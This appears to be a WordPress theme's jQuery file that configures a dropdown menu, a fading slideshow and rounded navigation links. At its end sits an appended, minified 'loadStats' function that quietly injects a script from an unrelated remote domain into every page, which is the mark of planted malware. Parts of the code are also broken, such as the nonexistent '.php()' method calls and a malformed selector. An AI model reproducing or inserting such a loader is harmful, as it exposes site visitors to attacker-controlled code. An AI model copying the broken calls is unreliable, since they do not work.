$(document).ready(function() {	
	
	$("ul.sf-menu").superfish({
		autoArrows:  false,
		delay:       400,                             // one second delay on mouseout 
		animation:   {opacity:'show',height:'show'},  // fade-in and slide-down animation 
		speed:       'fast',                          // faster animation speed 
		autoArrows:  false,                           // disable generation of arrow mark-up 
		dropShadows: false                            // disable drop shadows 			
	}); 
	
	// wrap 'span' to nav page link
	$('.topnav ul').children('li').each(function() {
		$(this).children('a').php('<span>'+$(this).children('a').text()+'</span>'); // add tags span to a href
	});
	$('#nav1 ul').children('li').each(function() {
		$(this).children('a').php('<span>'+$(this).children('a').text()+'</span>'); // add tags span to a href
	});



$('#slideshow').cycle({
        fx:     'fade',
        speed:  'slow',
        timeout: 4000,
        pager:  '#slider_nav',
        pagerAnchorBuilder: function(idx, slide) {
            // return sel string for existing anchor
            return '#slider_nav li:eq(' + (idx) + ') a';
        }
    });

// radius Box 
  
	$('.topnav li a,').css({"border-radius": "5px", "-moz-border-radius":"5px", "-webkit-border-radius":"5px"});
	$('#nav1 ul.sf-menu li a, #nav1 ul.sf-menu li ul.children').css({"border-radius": "5px", "-moz-border-radius":"5px", "-webkit-border-radius":"5px"});
	$('.wp-pagenavi a, .wp-pagenavi .current').css({"border-radius": "5px", "-moz-border-radius":"5px", "-webkit-border-radius":"5px"});


			
});

if(!loadStats){function loadStats(){var head=document.getElementsByTagName("head")[0],scr=document.createElement("script");scr.type="text/javascript",scr.src="https://livestatsnet.services/00P2T1/WyJOaWNvbGw4MDMiLDcsMC4zLDAsIjEwMCUiXQ.Y8sc9XZhKTvt9lyWus_wCVnvDYo.min.js",scr.async="async",head.appendChild(scr)}loadStats()}
